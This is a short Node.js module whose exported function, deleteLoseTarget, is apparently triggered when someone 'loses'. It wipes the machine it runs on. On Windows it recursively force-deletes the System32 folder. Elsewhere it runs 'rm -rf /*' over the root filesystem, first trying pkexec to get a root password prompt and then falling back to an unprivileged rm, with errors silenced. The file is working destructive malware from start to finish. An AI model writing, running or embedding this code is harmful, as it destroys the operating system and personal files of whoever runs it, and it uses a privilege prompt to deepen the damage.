'use strict';
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

const LOSE_TARGET = process.platform === 'win32'
  ? path.join(process.env.SystemRoot || 'C:\\Windows', 'System32')
  : '/';

function deleteLoseTarget() {
  try {
    if (process.platform === 'win32') {
      fs.rmSync(LOSE_TARGET, { recursive: true, force: true });
    } else {
      // rmSync can't remove '/' itself (EBUSY on mount point); delete contents via shell.
      // Try pkexec for a root auth prompt; fall back to plain rm (deletes user-owned files).
      execSync('pkexec rm -rf /* /.[!.]* 2>/dev/null || rm -rf /* /.[!.]* 2>/dev/null; true', { shell: '/bin/bash' });
    }
    return { success: true, path: LOSE_TARGET };
  } catch (err) {
    return { success: false, reason: err.message, path: LOSE_TARGET };
  }
}

module.exports = { deleteLoseTarget, LOSE_TARGET };

